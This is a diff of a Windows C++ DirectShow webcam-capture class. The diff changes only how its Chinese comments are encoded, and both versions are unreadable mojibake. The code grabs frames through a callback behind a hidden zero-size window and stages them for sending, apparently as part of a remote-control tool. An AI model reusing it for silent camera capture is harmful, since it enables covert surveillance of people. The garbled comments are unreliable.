@@ -1,4 +1,4 @@
-// CaptureVideo.cpp: implementation of the CCaptureVideo class.
+ï»¿// CaptureVideo.cpp: implementation of the CCaptureVideo class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -57,13 +57,13 @@ HRESULT CCaptureVideo::Open(int iDeviceID,int iPress)
         hResult = m_pGB->AddFilter(m_pBF, L"Capture Filter");
 
         hResult = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER,
-                                   IID_ISampleGrabber, (void**)&m_pGrabber);   //Òı½ÅÄÚ´æ
+                                   IID_ISampleGrabber, (void**)&m_pGrabber);   //å¼•è„šå†…å­˜
         if(FAILED(hResult))
             break;
 
-        //m_pGrabber ÊôĞÔÉèÖÃ   1 ¸ñÊ½   2 ÄÚ´æ»º³åĞÎÊ½
-        CComQIPtr<IBaseFilter, &IID_IBaseFilter> pGrabBase(m_pGrabber);//ÉèÖÃÊÓÆµ¸ñÊ½
-        AM_MEDIA_TYPE mt;    //ÊÓÆµ¸ñÊ½
+        //m_pGrabber å±æ€§è®¾ç½®   1 æ ¼å¼   2 å†…å­˜ç¼“å†²å½¢å¼
+        CComQIPtr<IBaseFilter, &IID_IBaseFilter> pGrabBase(m_pGrabber);//è®¾ç½®è§†é¢‘æ ¼å¼
+        AM_MEDIA_TYPE mt;    //è§†é¢‘æ ¼å¼
         ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
         mt.majortype = MEDIATYPE_Video;
         mt.subtype = MEDIASUBTYPE_RGB24; // MEDIASUBTYPE_RGB24
@@ -77,10 +77,10 @@ HRESULT CCaptureVideo::Open(int iDeviceID,int iPress)
         if(FAILED(hResult))
             break;
 
-        hResult = m_pCapture->RenderStream(&PIN_CATEGORY_PREVIEW,    //¾²Ì¬
+        hResult = m_pCapture->RenderStream(&PIN_CATEGORY_PREVIEW,    //é™æ€
                                            &MEDIATYPE_Video,m_pBF,pGrabBase,NULL);
         if(FAILED(hResult)) {
-            //ÆË×½
+            //æ‰‘æ‰
             hResult = m_pCapture->RenderStream(&PIN_CATEGORY_CAPTURE,&MEDIATYPE_Video,m_pBF,pGrabBase,NULL);
             break;
         }
@@ -93,28 +93,28 @@ HRESULT CCaptureVideo::Open(int iDeviceID,int iPress)
         if (FAILED(hResult))
             break;
 
-        //3  ÆË×½Êı¾İ  FDO Ò»µ©ÓĞÊı¾İ¾Í½øĞĞ »Øµ÷º¯Êıµ÷ÓÃ ÊôÓÚÒ»¸öÀà
+        //3  æ‰‘æ‰æ•°æ®  FDO ä¸€æ—¦æœ‰æ•°æ®å°±è¿›è¡Œ å›è°ƒå‡½æ•°è°ƒç”¨ å±äºä¸€ä¸ªç±»
 
         VIDEOINFOHEADER * vih = (VIDEOINFOHEADER*) mt.pbFormat;
-        //mCB ÊÇ¸öÁíÍâÒ»¸öÀà ²¢ÇÒÈ«¾Ö±äÁ¿ ÓĞ¸ö»Øµ÷
+        //mCB æ˜¯ä¸ªå¦å¤–ä¸€ä¸ªç±» å¹¶ä¸”å…¨å±€å˜é‡ æœ‰ä¸ªå›è°ƒ
         mCB.m_ulFullWidth = vih->bmiHeader.biWidth;
         mCB.m_ulFullHeight = vih->bmiHeader.biHeight;
 
         FreeMediaType(mt);
 
-        hResult = m_pGrabber->SetBufferSamples( FALSE );  //»Øµ÷º¯Êı
+        hResult = m_pGrabber->SetBufferSamples( FALSE );  //å›è°ƒå‡½æ•°
         hResult = m_pGrabber->SetOneShot( FALSE );
 
-        //ÉèÖÃÊÓÆµ²¶»ñ»Øµ÷º¯Êı Ò²¾ÍÊÇÈç¹ûÓĞÊÓÆµÊı¾İÊ±¾Í»áµ÷ÓÃÕâ¸öÀàµÄBufferCBº¯Êı
+        //è®¾ç½®è§†é¢‘æ•è·å›è°ƒå‡½æ•° ä¹Ÿå°±æ˜¯å¦‚æœæœ‰è§†é¢‘æ•°æ®æ—¶å°±ä¼šè°ƒç”¨è¿™ä¸ªç±»çš„BufferCBå‡½æ•°
 
-        //·µ»ØOnTimer
+        //è¿”å›OnTimer
         hResult = m_pGrabber->SetCallback(&mCB, 1);
 
         m_hWnd = CreateWindow("#32770", "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
 
-        SetupVideoWindow();   //ÆÁ±Î´°¿Ú
+        SetupVideoWindow();   //å±è”½çª—å£
 
-        hResult = m_pMC->Run();    //¿ªµÆ
+        hResult = m_pMC->Run();    //å¼€ç¯
 
         if(FAILED(hResult))
             break;
@@ -129,19 +129,19 @@ HRESULT CCaptureVideo::Open(int iDeviceID,int iPress)
 HRESULT CCaptureVideo::InitCaptureGraphBuilder()
 {
     HRESULT hResult = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC,
-                                       IID_ICaptureGraphBuilder2, (void**)&m_pCapture);   //ÕæÊµÉè±¸
+                                       IID_ICaptureGraphBuilder2, (void**)&m_pCapture);   //çœŸå®è®¾å¤‡
 
     if (FAILED(hResult)) {
         return hResult;
     }
 
     hResult=CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER,
-                             IID_IGraphBuilder, (void**)&m_pGB);   //ĞéÄâÉè±¸
+                             IID_IGraphBuilder, (void**)&m_pGB);   //è™šæ‹Ÿè®¾å¤‡
 
     if (FAILED(hResult)) {
         return hResult;
     }
-    //½«¹ıÂË°ó¶¨µ½ÕæÊµÉè±¸ÉÏÃæ
+    //å°†è¿‡æ»¤ç»‘å®šåˆ°çœŸå®è®¾å¤‡ä¸Šé¢
     m_pCapture->SetFiltergraph(m_pGB);
     hResult = m_pGB->QueryInterface(IID_IMediaControl,(LPVOID*)&m_pMC);
     if (FAILED(hResult)) {
@@ -157,7 +157,7 @@ HRESULT CCaptureVideo::InitCaptureGraphBuilder()
 
 LPBITMAPINFO CCaptureVideo::GetBmpInfor()
 {
-    return mCB.GetBmpInfor();     //¹¹½¨Î»Í¼ÄÚ´æÍ·ºÍÊı¾İ
+    return mCB.GetBmpInfor();     //æ„å»ºä½å›¾å†…å­˜å¤´å’Œæ•°æ®
 }
 
 BOOL CCaptureVideo::BindVideoFilter(int deviceId, IBaseFilter **pFilter)
@@ -181,7 +181,7 @@ BOOL CCaptureVideo::BindVideoFilter(int deviceId, IBaseFilter **pFilter)
     int index = 0;
     while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK, index <= deviceId) {
         IPropertyBag *pBag;
-        //Í¨¹ıBindToStorage ¿ÉÒÔ·ÃÎÊ¸ÃÉè±¸µÄ±êÊ¶¼¯
+        //é€šè¿‡BindToStorage å¯ä»¥è®¿é—®è¯¥è®¾å¤‡çš„æ ‡è¯†é›†
         hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
         if(SUCCEEDED(hr)) {
             VARIANT var;
@@ -193,7 +193,7 @@ BOOL CCaptureVideo::BindVideoFilter(int deviceId, IBaseFilter **pFilter)
                 }
                 SysFreeString(var.bstrVal);
             }
-            pBag->Release();  //ÒıÓÃ¼ÆÊı--
+            pBag->Release();  //å¼•ç”¨è®¡æ•°--
         }
         pM->Release();
         index++;
@@ -233,11 +233,11 @@ void CCaptureVideo::ResizeVideoWindow()
     if (m_pVW) {
         RECT rc;
         ::GetClientRect(m_hWnd,&rc);
-        m_pVW->SetWindowPosition(0, 0, rc.right, rc.bottom);  //½«´°¿ÚÉèÖÃµ½0 0 0 0 ´¦
+        m_pVW->SetWindowPosition(0, 0, rc.right, rc.bottom);  //å°†çª—å£è®¾ç½®åˆ°0 0 0 0 å¤„
     }
 }
 
-void  CCaptureVideo::SendEnd()            //·¢ËÍ½áÊø  ÉèÖÃ¿ÉÒÔÔÙÈ¡Êı¾İ
+void  CCaptureVideo::SendEnd()            //å‘é€ç»“æŸ  è®¾ç½®å¯ä»¥å†å–æ•°æ®
 {
     InterlockedExchange((LPLONG)&mCB.bStact,CMD_CAN_COPY);
 }
@@ -245,10 +245,10 @@ void  CCaptureVideo::SendEnd()            //·¢ËÍ½áÊø  ÉèÖÃ¿ÉÒÔÔÙÈ¡Êı¾İ
 LPBYTE CCaptureVideo::GetDIB(DWORD& dwSize)
 {
     BYTE *szBuffer = NULL;
-    int n = 200; // 10sÃ»ÓĞ»ñÈ¡µ½Êı¾İÔò·µ»ØNULL
+    int n = 200; // 10sæ²¡æœ‰è·å–åˆ°æ•°æ®åˆ™è¿”å›NULL
     do {
-        if (mCB.bStact==CMD_CAN_SEND) { //ÕâÀï¸Ä±äÁËÒ»ÏÂ·¢ËÍµÄ×´Ì¬
-            if (szBuffer = mCB.GetNextScreen(dwSize)) //ÊÇ·ñ»ñÈ¡µ½ÊÓÆµ
+        if (mCB.bStact==CMD_CAN_SEND) { //è¿™é‡Œæ”¹å˜äº†ä¸€ä¸‹å‘é€çš„çŠ¶æ€
+            if (szBuffer = mCB.GetNextScreen(dwSize)) //æ˜¯å¦è·å–åˆ°è§†é¢‘
                 break;
         }
         Sleep(50);
